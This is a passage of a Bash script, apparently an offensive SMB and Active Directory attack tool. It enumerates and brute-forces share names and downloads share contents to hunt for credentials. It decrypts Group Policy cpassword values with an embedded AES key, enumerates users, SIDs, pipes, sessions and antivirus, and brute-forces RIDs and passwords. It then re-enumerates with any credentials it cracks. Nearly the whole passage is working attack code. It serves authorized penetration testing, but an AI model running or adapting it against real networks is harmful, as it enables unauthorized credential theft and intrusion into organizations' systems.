if command -v rpcclient &>/dev/null; then
    RPC_SHLIST=$(_rpc "netshareenumall"); CUR_SH=""
    while IFS= read -r line; do
        echo "$line" | grep -q "^netname:" && \
            CUR_SH=$(echo "$line" | sed 's/^netname:\s*//' | tr -d ' \r')
        echo "$line" | grep -qP "^\s*path:" && [[ -n "$CUR_SH" ]] && \
            SHARE_PATHS["$CUR_SH"]=$(echo "$line" | sed 's/.*path:\s*//' | tr -d ' \r')
    done <<< "$RPC_SHLIST"
    printf '%s\n' "$RPC_SHLIST" >> "$OUTFILE"
fi

echo ""
printf '\n--- Share Details ---\n' >> "$OUTFILE"
for S in "${SHARES[@]}"; do
    SC="${SHARE_COMMENTS[$S]}"; SP="${SHARE_PATHS[$S]}"
    PERM=$(echo "$SM" | grep -E "^\s+${S}\b" | grep -oP '(READ ONLY|READ, WRITE|READ,WRITE|WRITE ONLY|NO ACCESS)' | head -1)
    echo -e "\n  ${GRN}»${RST}  ${WHT}${BLD}${S}${RST}"
    [[ -n "$SC"   ]] && echo -e "       Comment    : ${CYN}${SC}${RST}"
    [[ -n "$SP"   ]] && echo -e "       Server Path: ${YLW}${SP}${RST}"
    [[ -n "$PERM" ]] && echo -e "       Permissions: ${PERM}"
    printf '  SHARE: %-20s | Comment: %-25s | Path: %-20s | Perm: %s\n' \
        "$S" "$SC" "$SP" "$PERM" >> "$OUTFILE"
    echo "${SC}${SP}" | grep -qi "backup"               && warn "  Backup share!"
    echo "${SC}${SP}" | grep -qi "logon\|script"        && warn "  Logon script share!"
    echo "${SC}${SP}" | grep -qi "admin\|dev\|IT\|test" && warn "  Admin/Dev/IT share!"
    echo "$S" | grep -qi "SYSVOL\|NETLOGON"             && warn "  Policy share — check GPP!"
    [[ "$PERM" =~ WRITE ]] && {
        if test_write_share "$S"; then
            found "  WRITE CONFIRMED: Can write files to ${S}!"
            printf '  [WRITE_OK] %s\n' "$S" >> "$OUTFILE"
        else
            warn "  Reported writable but write test failed: ${S}"
        fi
    }
done
[[ ${#SHARES[@]} -eq 0 ]] && miss "No disk shares found"

# ================================================================
#  3.5  SHARE NAME BRUTE FORCE
# ================================================================
DEF_SHARE_WL="/usr/share/seclists/Discovery/Network/SMB-default-shares.txt"

if [[ ${#SHARES[@]} -eq 0 ]]; then
    hdr "Share Name Brute Force"
    inf "No shares found — trying share name brute force"
    echo -e "  ${DIM}Default wordlist: ${DEF_SHARE_WL}${RST}"
    read -rp "$(echo -e "      ${YLW}Share wordlist [Enter=default / path / n=skip]: ${RST}")" SH_WL_IN
    if [[ "${SH_WL_IN,,}" != "n" ]]; then
        CHOSEN_WL="${SH_WL_IN:-$DEF_SHARE_WL}"
        if [[ ! -f "$CHOSEN_WL" ]]; then
            warn "Wordlist not found — using built-in list"
            CHOSEN_WL=$(mktemp /tmp/sh_wl_XXXX)
            printf '%s\n' ADMIN C$ IPC$ NETLOGON SYSVOL PRINT$ Data Backup Share Files \
                Users Public Home IT Dev Temp Logs Config Scripts Tools Finance HR \
                Legal Marketing Sales Web FTP Documents Reports Shared Transfer \
                Archive Staging Production Test Build Source Database Secrets Certs \
                >> "$CHOSEN_WL"
        fi
        share_brute "$CHOSEN_WL"
        [[ "$CHOSEN_WL" == /tmp/sh_wl_* ]] && rm -f "$CHOSEN_WL"
    fi
else
    echo ""
    echo -e "  ${CYN}[?]${RST} Brute-force for hidden shares? [y/N]"
    read -rp "      " DO_SH_BF
    if [[ "${DO_SH_BF,,}" == "y" ]]; then
        hdr "Share Name Brute Force  (hidden)"
        echo -e "  ${DIM}Default wordlist: ${DEF_SHARE_WL}${RST}"
        read -rp "$(echo -e "      ${YLW}Share wordlist [Enter=default / path]: ${RST}")" SH_WL_IN2
        CHOSEN_WL="${SH_WL_IN2:-$DEF_SHARE_WL}"
        [[ -f "$CHOSEN_WL" ]] && share_brute "$CHOSEN_WL" || warn "Wordlist not found: ${CHOSEN_WL}"
    fi
fi

# ================================================================
#  4. CONTENT → DOWNLOAD → HUNT
# ================================================================
hdr "Content  →  Download  →  Credential Hunt"

mkdir -p "$DL_DIR"; printf '\n--- Content & Hunt ---\n' >> "$OUTFILE"
for SHARE in "${SHARES[@]}"; do
    enum_share_deep "$SHARE" "$SMB_USER" "$SMB_PASS"
done
echo ""
[[ $TOTAL_FILES -gt 0 ]] && item "Total files"         "${TOTAL_FILES}  →  ${DL_DIR}/"
[[ $SENS        -gt 0 ]] && found "Sensitive files: ${SENS}"
[[ $CRED_HIT    -gt 0 ]] && found "Credential findings: ${CRED_HIT}"
[[ $SENS -eq 0 && $CRED_HIT -eq 0 && $TOTAL_FILES -gt 0 ]] && miss "No sensitive data found"
[[ ${#SHARES[@]} -eq 0 ]] && miss "No shares to enumerate"

# ================================================================
#  4.5  SYSVOL / GPP HUNT
# ================================================================
hdr "SYSVOL / GPP Password Hunt"

printf '\n--- SYSVOL/GPP ---\n' >> "$OUTFILE"
GPP_FOUND=0
for GSHARE in SYSVOL NETLOGON; do
    GDIR="${DL_DIR}/${GSHARE}"
    if [[ ! -d "$GDIR" ]]; then
        mkdir -p "$GDIR"; local_op="$PWD"; cd "$GDIR"
        _smbc_raw "$GSHARE" -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1 || true
        cd "$local_op"
    fi
    for GPPFILE in Groups.xml Scheduledtasks.xml Services.xml Datasources.xml Printers.xml; do
        while IFS= read -r gf; do
            inf "GPP file: ${gf#${DL_DIR}/}"
            CPW=$(grep -aoPh 'cpassword="[^"]+"' "$gf" 2>/dev/null | head -5)
            if [[ -n "$CPW" ]]; then
                GPP_FOUND=$((GPP_FOUND+1))
                found "GPP cpassword in: ${gf#${DL_DIR}/}"
                printf '  [GPP] %s\n' "${gf#${DL_DIR}/}" >> "$OUTFILE"
                while IFS= read -r cpline; do
                    ENC=$(echo "$cpline" | grep -oP '(?<=cpassword=")[^"]+')
                    echo -e "    ${RED}»${RST}  cpassword: ${ENC}"
                    printf '    cpassword: %s\n' "$ENC" >> "$OUTFILE"
                    if command -v python3 &>/dev/null; then
                        DEC=$(python3 - <<PYEOF 2>/dev/null
import base64
try:
    from Crypto.Cipher import AES
    key=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
    enc='${ENC}'; pad=4-len(enc)%4
    if pad!=4: enc+='='*pad
    data=base64.b64decode(enc)
    c=AES.new(key,AES.MODE_CBC,data[:16])
    print(c.decrypt(data[16:]).decode('utf-16-le').rstrip('\x00').strip())
except: pass
PYEOF
                        )
                        [[ -n "$DEC" ]] && found "GPP DECRYPTED: ${DEC}" && \
                            printf '  [GPP_PLAIN] %s\n' "$DEC" >> "$OUTFILE"
                    fi
                    GPP_USER=$(grep -aoPh 'userName="[^"]+"' "$gf" 2>/dev/null | head -1 | grep -oP '(?<=")[^"]+')
                    [[ -n "$GPP_USER" ]] && item "GPP User" "$GPP_USER" && \
                        [[ " ${FOUND_USERS[*]} " != *" ${GPP_USER} "* ]] && FOUND_USERS+=("$GPP_USER")
                done <<< "$CPW"
            fi
        done < <(find "$GDIR" -iname "$GPPFILE" 2>/dev/null)
    done
done
[[ $GPP_FOUND -gt 0 ]] && found "GPP passwords: ${GPP_FOUND}" \
                        || miss "No GPP passwords (SYSVOL/NETLOGON)"

# ================================================================
#  5. USER ENUMERATION
# ================================================================
hdr "User Enumeration"

USER_OK=0
if command -v rpcclient &>/dev/null; then
    UR=$(_rpc "enumdomusers")
    if echo "$UR" | grep -q "user:\["; then
        USER_OK=1; inf "M1 (rpcclient enumdomusers)"
        while IFS= read -r line; do
            UN=$(echo "$line" | grep -oP 'user:\[\K[^\]]+')
            RI=$(echo "$line" | grep -oP 'rid:\[\K[^\]]+')
            [[ -z "$UN" ]] && continue
            item "$UN" "RID:${RI}"; FOUND_USERS+=("$UN")
            printf '  USER: %s  RID:%s\n' "$UN" "$RI" >> "$OUTFILE"
        done <<< "$UR"
    fi
fi
if [[ $USER_OK -eq 0 ]] && [[ -n "$CME_BIN" ]]; then
    UR=$(_cme --users)
    echo "$UR" | grep -qi "Last PW\|sAMAccountName" && {
        USER_OK=1; inf "M2 ($CME_BIN --users)"
        echo "$UR" | grep -vE '^\[|\-+$|^\s*$' | while IFS= read -r l; do
            [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"
        done
        printf '%s\n' "$UR" >> "$OUTFILE"; }
fi
if [[ $USER_OK -eq 0 ]]; then
    for e4l in enum4linux-ng enum4linux; do
        command -v "$e4l" &>/dev/null || continue
        if [[ -n "$SMB_USER" ]]; then
            UR=$($e4l -A -u "$SMB_USER" -p "$SMB_PASS" "$TARGET" 2>/dev/null)
        else
            UR=$($e4l -A "$TARGET" 2>/dev/null)
        fi
        echo "$UR" | grep -qi "username:" && {
            USER_OK=1; inf "M3 ($e4l -A)"
            echo "$UR" | grep -i "username:" | while IFS= read -r l; do
                UN=$(echo "$l" | grep -oP '(?<=username:\s)\S+')
                [[ -n "$UN" ]] && item "$UN" && FOUND_USERS+=("$UN") && \
                    printf '  USER: %s\n' "$UN" >> "$OUTFILE"
            done; }
        break
    done
fi
if command -v rpcclient &>/dev/null; then
    QDI=$(_rpc "querydispinfo")
    echo "$QDI" | grep -qi "Account:" && {
        [[ $USER_OK -eq 0 ]] && inf "querydispinfo fallback"
        while IFS= read -r line; do
            UN=$(echo "$line" | grep -oP '(?<=Account:)\S+')
            [[ -z "$UN" ]] && continue
            [[ " ${FOUND_USERS[*]} " != *" ${UN} "* ]] && \
                FOUND_USERS+=("$UN") && item "$UN" "via querydispinfo" && \
                printf '  USER: %s\n' "$UN" >> "$OUTFILE"
        done <<< "$QDI"; USER_OK=1; }
    QDI2=$(_rpc "querydispinfo2")
    echo "$QDI2" | grep -qi "Account:" && {
        inf "Machine accounts:"
        while IFS= read -r line; do
            MC=$(echo "$line" | grep -oP '(?<=Account:)\S+')
            [[ -z "$MC" ]] && continue
            echo -e "    ${DIM}»  ${MC}  (computer)${RST}"; FOUND_COMPUTERS+=("$MC")
            printf '  COMPUTER: %s\n' "$MC" >> "$OUTFILE"
        done <<< "$QDI2"; }
fi
if command -v nmap &>/dev/null; then
    if [[ -n "$SMB_USER" ]]; then
        NM_U=$(nmap -p "$SMB_PORT" --script smb-enum-users \
            --script-args "smbusername=${SMB_USER},smbpassword=${SMB_PASS}" \
            "$TARGET" 2>/dev/null)
    else
        NM_U=$(nmap -p "$SMB_PORT" --script smb-enum-users "$TARGET" 2>/dev/null)
    fi
    echo "$NM_U" | grep -qi "Account\|DOMAIN" && {
        inf "nmap smb-enum-users:"
        echo "$NM_U" | grep -E "Account|Full name|Description|Flags" | while IFS= read -r l; do
            echo -e "  ${DIM}${l}${RST}"
            UN=$(echo "$l" | grep -oP '(?<=Account: )\S+')
            [[ -n "$UN" && " ${FOUND_USERS[*]} " != *" ${UN} "* ]] && FOUND_USERS+=("$UN")
        done
        printf '%s\n' "$NM_U" >> "$OUTFILE"; }
fi
if [[ -n "$CME_BIN" ]]; then
    LU=$(_cme --lusers)
    echo "$LU" | grep -qi "LocalUser\|Administrator" && {
        inf "Local users ($CME_BIN --lusers):"
        echo "$LU" | grep -vE '^\[|\-+$|^\s*$' | while IFS= read -r l; do
            [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done
        printf '%s\n' "$LU" >> "$OUTFILE"; }
    LO=$(_cme --loggedon-users)
    echo "$LO" | grep -qi "LoggedOn\|LOGON" && {
        inf "Logged-on users:"
        echo "$LO" | grep -vE '^\[|\-+$|^\s*$' | while IFS= read -r l; do
            [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"
            UN=$(echo "$l" | grep -oP '\\\K\S+' | head -1)
            [[ -n "$UN" && " ${FOUND_USERS[*]} " != *" ${UN} "* ]] && FOUND_USERS+=("$UN")
        done
        printf '%s\n' "$LO" >> "$OUTFILE"; }
fi
[[ $USER_OK -eq 0 ]] && miss "User enumeration failed"

# user detail
if [[ ${#FOUND_USERS[@]} -gt 0 ]] && command -v rpcclient &>/dev/null; then
    echo ""
    ALL_RIDS=$(_rpc "enumdomusers")
    for UN in "${FOUND_USERS[@]}"; do
        UD_RID=$(echo "$ALL_RIDS" | grep "user:\[${UN}\]" | grep -oP 'rid:\[\K[^\]]+')
        [[ -z "$UD_RID" ]] && continue
        UI=$(_rpc "queryuser ${UD_RID}"); [[ -z "$UI" ]] && continue
        UD_FULL=$( echo "$UI" | grep "Full Name"         | awk -F: '{print $2}' | sed 's/^\s*//')
        UD_LOGON=$(echo "$UI" | grep "Logon Script"      | awk -F: '{print $2}' | sed 's/^\s*//')
        UD_HOME=$( echo "$UI" | grep "Home Drive"        | sed 's/.*://' | sed 's/^\s*//')
        UD_LASTPW=$(echo "$UI"| grep "Password last set" | sed 's/.*://')
        UD_BADPW=$(echo "$UI" | grep "bad_password_count"| grep -oP '0x[0-9a-f]+')
        UD_NOPW=$( _rpc "getusrdompwinfo ${UD_RID}" | grep -qi "PASSWD_NOTREQD" && echo "YES")
        UD_NOEXP=$(_rpc "getusrdompwinfo ${UD_RID}" | grep -qi "DONT_EXPIRE"    && echo "YES")
        echo ""; inf "${WHT}${UN}${RST}  RID:${UD_RID}"
        [[ -n "$UD_FULL"  && "$UD_FULL"  != " " ]] && inf "  Full Name   : ${UD_FULL}"
        [[ -n "$UD_HOME"  && "$UD_HOME"  != " " ]] && inf "  Home Drive  : ${UD_HOME}"
        [[ -n "$UD_LOGON" && "$UD_LOGON" != " " ]] && { inf "  Logon Script: ${UD_LOGON}"; warn "Logon script!"; }
        [[ -n "$UD_LASTPW"                       ]] && inf "  PW last set : ${UD_LASTPW}"
        [[ "$UD_BADPW" != "0x00000000" && -n "$UD_BADPW" ]] && warn "  Bad PW count: ${UD_BADPW}"
        [[ "$UD_NOPW"  == "YES" ]] && found "  No password required: ${UN}!"
        [[ "$UD_NOEXP" == "YES" ]] && warn  "  Password never expires: ${UN}"
        printf '  USERDETAIL: %s  RID:%s\n' "$UN" "$UD_RID" >> "$OUTFILE"
    done
fi

# ================================================================
#  6. DEEP RPC  /  NAMED PIPES  /  SID ENUM
# ================================================================
hdr "Deep RPC  /  Named Pipes  /  SID Enumeration"

if command -v rpcclient &>/dev/null && [[ $AUTH_OK -eq 1 ]]; then
    printf '\n--- Deep RPC ---\n' >> "$OUTFILE"

    DR=$(_rpc "dsroledominfo")
    [[ -n "$DR" ]] && echo "$DR" | grep -qv "NT_STATUS" && {
        inf "Domain role:"; echo "$DR" | while IFS= read -r l; do [[ -z "$l" ]] && continue; inf "  ${l}"; done
        echo "$DR" | grep -qi "PDC\|BDC\|DOMAIN_CTRL" && warn "Domain Controller!"
        printf '%s\n' "$DR" >> "$OUTFILE"; }

    LDOM=$(_rpc "lookupdomain DOMAIN 2>/dev/null")
    [[ -z "$LDOM" ]] && LDOM=$(_rpc "lookupdomain ${SRV_NAME}" 2>/dev/null)
    [[ -n "$LDOM" ]] && echo "$LDOM" | grep -qv "NT_STATUS" && {
        DOMAIN_SID=$(echo "$LDOM" | grep -oP 'S-\d-\d+-[\d-]+')
        [[ -n "$DOMAIN_SID" ]] && item "Domain SID" "$DOMAIN_SID" && \
            printf '  DOMAIN_SID: %s\n' "$DOMAIN_SID" >> "$OUTFILE"; }

    GP=$(_rpc "enumdomgroups")
    [[ -n "$GP" ]] && echo "$GP" | grep -q "group:\[" && {
        inf "Domain groups:"; echo "$GP" | grep "group:\[" | while IFS= read -r l; do inf "  ${l}"; done
        printf '%s\n' "$GP" >> "$OUTFILE"; }

    GP2=$(_rpc "enumalsgroups builtin")
    [[ -n "$GP2" ]] && {
        echo "$GP2" | grep -i "admin\|remote\|rdp" | while IFS= read -r l; do warn "Admin group: $l"; done
        printf '%s\n' "$GP2" >> "$OUTFILE"; }

    EP=$(_rpc "enumprinters")
    [[ -n "$EP" ]] && echo "$EP" | grep -qv "NT_STATUS_ACCESS_DENIED" && {
        inf "Printers:"; echo "$EP" | while IFS= read -r l; do [[ -z "$l" ]] && continue; inf "  ${l}"; done
        printf '%s\n' "$EP" >> "$OUTFILE"; }

    SESS=$(_rpc "netsessenum")
    [[ -n "$SESS" ]] && echo "$SESS" | grep -qv "NT_STATUS\|^$\|command not found" && {
        inf "Active sessions:"; echo "$SESS" | while IFS= read -r l; do [[ -z "$l" ]] && continue; inf "  ${l}"; done
        printf '%s\n' "$SESS" >> "$OUTFILE"; }

    POL=$(_rpc "getdompwinfo")
    [[ -n "$POL" ]] && {
        inf "Password policy:"; echo "$POL" | while IFS= read -r l; do [[ -z "$l" ]] && continue; inf "  ${l}"; done
        echo "$POL" | grep -qi "COMPLEX: false" && warn "No password complexity!"
        MINLEN=$(echo "$POL" | grep -oP 'min_password_length:\s*\K\d+' | head -1)
        [[ -n "$MINLEN" && $MINLEN -lt 5 ]] && warn "Min PW length = ${MINLEN}!"
        printf '%s\n' "$POL" >> "$OUTFILE"; }

    if [[ -n "$CME_BIN" ]]; then
        PP=$(_cme --pass-pol)
        echo "$PP" | grep -qi "minimum\|complexity\|lockout" && {
            inf "Password policy ($CME_BIN):"
            echo "$PP" | grep -vE '^\[|\-+$|^\s*$|^\s*SMB\s+[0-9].*\[\*\]' | while IFS= read -r l; do
                [[ -z "$l" ]] && continue; inf "  ${l}"; done
            printf '%s\n' "$PP" >> "$OUTFILE"; }
    fi

    SID_LIST=$(_rpc "lsaenumsid")
    [[ -n "$SID_LIST" ]] && echo "$SID_LIST" | grep -qv "NT_STATUS" && {
        inf "SID enumeration:"; printf '%s\n' "$SID_LIST" >> "$OUTFILE"
        while IFS= read -r line; do
            SID=$(echo "$line" | grep -oP 'S-\d-\d+-[\d-]+')
            [[ -z "$SID" ]] && continue
            LOOKUP=$(_rpc "lookupsids ${SID}")
            echo "$LOOKUP" | grep -qv "NT_STATUS\|could not" && {
                LNAME=$(echo "$LOOKUP" | grep -oP '\\\K\S+' | head -1)
                [[ -n "$LNAME" ]] && inf "  ${SID}  →  ${LNAME}" && \
                    printf '  SID %s -> %s\n' "$SID" "$LNAME" >> "$OUTFILE"; }
        done <<< "$SID_LIST"; }

    if command -v nmap &>/dev/null; then
        PIPES=$(nmap -p "$SMB_PORT" --script smb-enum-pipes "$TARGET" 2>/dev/null)
        echo "$PIPES" | grep -qi "pipe\|svcctl\|winreg\|samr" && {
            inf "Named Pipes:"
            echo "$PIPES" | grep -vE "^Start|Nmap scan|Host is up|PORT|^\|_" | \
            while IFS= read -r l; do [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done
            printf '%s\n' "$PIPES" >> "$OUTFILE"
            echo "$PIPES" | grep -qi "winreg"   && warn "winreg pipe — registry accessible!"
            echo "$PIPES" | grep -qi "svcctl"   && warn "svcctl pipe — service control!"
            echo "$PIPES" | grep -qi "eventlog" && warn "eventlog pipe accessible"; }

        if [[ -n "$SMB_USER" ]]; then
            NM_PROC=$(nmap -p "$SMB_PORT" --script smb-enum-processes \
                --script-args "smbusername=${SMB_USER},smbpassword=${SMB_PASS}" \
                "$TARGET" 2>/dev/null)
        else
            NM_PROC=$(nmap -p "$SMB_PORT" --script smb-enum-processes "$TARGET" 2>/dev/null)
        fi
        echo "$NM_PROC" | grep -qi "Process\|PID" && {
            inf "Running processes:"; printf '%s\n' "$NM_PROC" >> "$OUTFILE"
            echo "$NM_PROC" | grep -qi "antivirus\|defender\|avast\|kaspersky\|mcafee" && \
                warn "AV/EDR detected!"; }

        NM_SESS=$(nmap -p "$SMB_PORT" --script smb-enum-sessions "$TARGET" 2>/dev/null)
        echo "$NM_SESS" | grep -qi "user\|session" && {
            inf "Sessions (nmap):"; printf '%s\n' "$NM_SESS" >> "$OUTFILE"
            echo "$NM_SESS" | grep -vE "^Start|Nmap scan|Host is up|PORT|^\|_" | \
            while IFS= read -r l; do [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done; }
    fi
else
    miss "RPC not accessible"
fi

# ================================================================
#  7. SMBMAP RECURSIVE
# ================================================================
hdr "smbmap  —  Recursive Map"

if command -v smbmap &>/dev/null && [[ ${#SHARES[@]} -gt 0 ]]; then
    printf '\n--- smbmap -R ---\n' >> "$OUTFILE"
    for S in "${SHARES[@]}"; do
        echo -e "\n  ${YLW}${BLD}// ${TARGET}/${S}${RST}"
        SM_R=$(_smbmap -R "$S")
        if [[ -n "$SM_R" ]]; then
            echo "$SM_R" | grep -vE '^\s*$' | while IFS= read -r l; do
                if echo "$l" | grep -qi "rw\|WRITE"; then
                    echo -e "    ${RED}${l}${RST}"; found "Writable path: ${l}"
                else
                    echo -e "    ${DIM}${l}${RST}"
                fi
            done
            printf '%s\n' "$SM_R" >> "$OUTFILE"
        else
            miss "No recursive access: ${S}"
        fi
    done
else
    miss "smbmap not available or no shares"
fi

# ================================================================
#  8. RID BRUTE FORCE
# ================================================================
hdr "RID Brute Force  (Hidden Users)"

echo -e "  ${CYN}[?]${RST} RID brute-force? [y/N]"
read -rp "      " DO_RID
if [[ "${DO_RID,,}" == "y" ]]; then
    printf '\n--- RID Brute ---\n' >> "$OUTFILE"
    if command -v rpcclient &>/dev/null; then
        inf "Scanning RIDs 500-1200..."
        for i in $(seq 500 1200); do
            RID_H=$(printf '%x' "$i")
            RID_RES=$(_rpc "queryuser 0x${RID_H}" | grep "User Name")
            [[ -z "$RID_RES" ]] && continue
            RID_UN=$(echo "$RID_RES" | awk -F: '{gsub(/ /,""); print $2}')
            echo -e "  ${GRN}»${RST}  ${WHT}${RID_UN}${RST}  ${DIM}(0x${RID_H})${RST}"
            printf '  RID_USER: %s  0x%s\n' "$RID_UN" "$RID_H" >> "$OUTFILE"
            [[ " ${FOUND_USERS[*]} " != *" ${RID_UN} "* ]] && FOUND_USERS+=("$RID_UN")
        done
    elif [[ -n "$CME_BIN" ]]; then
        _cme --rid-brute 1300 | grep "SidTypeUser" | tee -a "$OUTFILE" | \
        while IFS= read -r l; do
            UN=$(echo "$l" | grep -oP '\\[^\\]+$' | tr -d '\\')
            [[ -n "$UN" ]] && FOUND_USERS+=("$UN") && item "$UN"
        done
    else
        miss "No RID brute tool"
    fi
else
    miss "Skipped"
fi

# ================================================================
#  9. BRUTE FORCE
# ================================================================
hdr "Brute Force"

COMMENT_WORDS=()
for S in "${SHARES[@]}"; do
    for word in ${SHARE_COMMENTS[$S]} $S; do
        wl=$(echo "$word" | tr '[:upper:]' '[:lower:]' | tr -dc 'a-z0-9_-')
        [[ ${#wl} -lt 3 ]] && continue
        echo "$wl" | grep -qE '^(the|and|for|smb|disk|ipc|srv|file|print|samba|share|server|drivers)$' \
            && continue
        [[ " ${COMMENT_WORDS[*]} " != *" ${wl} "* ]] && COMMENT_WORDS+=("$wl")
    done
done

ALL_BF_TARGETS=("${FOUND_USERS[@]}")
for w in "${COMMENT_WORDS[@]}"; do
    [[ " ${ALL_BF_TARGETS[*]} " != *" ${w} "* ]] && ALL_BF_TARGETS+=("$w")
done

if [[ ${#ALL_BF_TARGETS[@]} -gt 0 ]]; then
    [[ ${#FOUND_USERS[@]} -gt 0 ]] && {
        echo -e "\n  ${CYN}Users:${RST}"
        for u in "${FOUND_USERS[@]}"; do echo -e "    ${GRN}»${RST}  ${u}"; done; }
    [[ ${#COMMENT_WORDS[@]} -gt 0 ]] && {
        echo -e "\n  ${CYN}Keywords from shares:${RST}"
        for w in "${COMMENT_WORDS[@]}"; do echo -e "    ${YLW}»${RST}  ${w}"; done; }
    echo ""
    echo -e "  ${CYN}[?]${RST} Run brute-force on ${#ALL_BF_TARGETS[*]} target(s)? [y/N]"
    read -rp "      " DO_BF
    if [[ "${DO_BF,,}" == "y" ]]; then
        ask_wordlist
        [[ -n "$WL_PASS" ]] && brute_users "${ALL_BF_TARGETS[@]}" || miss "No valid wordlist"
    else
        miss "Skipped"
    fi
else
    miss "No users or keywords to brute-force"
fi

# ================================================================
#  10. CIRCULAR  —  RE-ENUMERATE
# ================================================================
if grep -qa "VALID CRED:" "$OUTFILE" 2>/dev/null; then
    hdr "Re-Enumeration  (New Credentials)"
    VALID_LINE=$(grep "VALID CRED:" "$OUTFILE" | head -1)
    RE_U=$(echo "$VALID_LINE" | grep -oP '(?<=login: )\S+')
    RE_P=$(echo "$VALID_LINE" | grep -oP '(?<=password: )\S+')
    if [[ -n "$RE_U" && -n "$RE_P" ]]; then
        found "Re-enumerating with: ${RE_U}:${RE_P}"
        NEW_SL=$(smbclient -L "//${TARGET}" -p "$SMB_PORT" -U "${RE_U}%${RE_P}" 2>/dev/null)
        while IFS= read -r line; do
            NS=$(echo "$line" | awk '{print $1}')
            NT=$(echo "$line" | awk '{print $2}')
            [[ "$NT" != "Disk" ]] && continue
            [[ " ${SHARES[*]} " != *" ${NS} "* ]] && {
                found "NEW SHARE: ${NS}"; SHARES+=("$NS")
                printf '  [NEW_SHARE] %s\n' "$NS" >> "$OUTFILE"
                enum_share_deep "$NS" "$RE_U" "$RE_P"; }
        done < <(echo "$NEW_SL" | awk '/Sharename/{f=1;next} f && /Disk/{print}')
        NEW_USERS=$(rpcclient -U "${RE_U}%${RE_P}" -p "$SMB_PORT" "$TARGET" \
            -c "enumdomusers" 2>/dev/null | grep -oP 'user:\[\K[^\]]+')
        while IFS= read -r NU; do
            [[ -z "$NU" ]] && continue
            [[ " ${FOUND_USERS[*]} " != *" ${NU} "* ]] && \
                FOUND_USERS+=("$NU") && found "New user: ${NU}"
        done <<< "$NEW_USERS"
    fi
fi

# ================================================================
#  11. RISK SUMMARY
# ================================================================
hdr "Risk Summary"
echo ""
grep -qa "NULL SESSION"                    "$OUTFILE" && found "NULL SESSION — anonymous access"
grep -qai "EternalBlue.*VULNERABLE"        "$OUTFILE" && found "EternalBlue (MS17-010) VULNERABLE"
grep -qai "MS08-067.*VULNERABLE"           "$OUTFILE" && found "MS08-067 VULNERABLE"
grep -qai "SambaCry.*VULNERABLE"           "$OUTFILE" && found "SambaCry (CVE-2017-7494) VULNERABLE"
grep -qai "MS10-054.*VULNERABLE"           "$OUTFILE" && found "MS10-054 (BSoD) VULNERABLE"
grep -qai "MS10-061.*VULNERABLE"           "$OUTFILE" && found "MS10-061 (Print Spooler) VULNERABLE"
grep -qai "Signing DISABLED\|signing:False" "$OUTFILE" && warn "SMB Signing OFF — relay attack"
grep -qa  "WRITE_OK"                       "$OUTFILE" && found "Write confirmed on share!"
grep -qa  "WRITABLE"                       "$OUTFILE" && warn  "Writable share reported"
grep -qa  "PRIVATE KEY"                    "$OUTFILE" && found "SSH private key in files"
grep -qa  "\[CRED\]"                       "$OUTFILE" && found "Plaintext credentials in files"
grep -qa  "\[NTLM\]"                       "$OUTFILE" && found "NTLM hash — crack with hashcat"
grep -qa  "\[HASH\]"                       "$OUTFILE" && found "Linux hash — crack with hashcat"
grep -qa  "\[GPP\]"                        "$OUTFILE" && found "GPP cpassword — use gpp-decrypt!"
grep -qa  "GPP_PLAIN"                      "$OUTFILE" && found "GPP password DECRYPTED!"
grep -qa  "\[SENS\]"                       "$OUTFILE" && warn  "Sensitive files found"
grep -qai "Logon script"                   "$OUTFILE" && warn  "Logon script — injection possible"
grep -qai "No password required"           "$OUTFILE" && found "User with no password required!"
grep -qa  "VALID CRED:"                    "$OUTFILE" && found "Valid credentials via brute-force!"
grep -qai "Domain Controller"              "$OUTFILE" && warn  "DC found — deeper AD enum possible"
grep -qa  "SHARE_BF.*ACCESS=YES"           "$OUTFILE" && found "Hidden accessible shares found!"
grep -qai "winreg pipe"                    "$OUTFILE" && warn  "winreg pipe — registry attack"
grep -qai "svcctl pipe"                    "$OUTFILE" && warn  "svcctl pipe — service control"
grep -qai "AV.*EDR\|AV/EDR"               "$OUTFILE" && warn  "AV/EDR detected on target"

echo ""
echo -e "  ${BLU}${BLD}────────────────────────────────────────────${RST}"
echo -e "  ${GRN}${BLD}Report :${RST}  ${OUTFILE}"
[[ -d "$DL_DIR" && $TOTAL_FILES -gt 0 ]] && echo -e "  ${GRN}${BLD}Files  :${RST}  ${DL_DIR}/"
echo -e "  ${BLU}${BLD}────────────────────────────────────────────${RST}"
echo ""
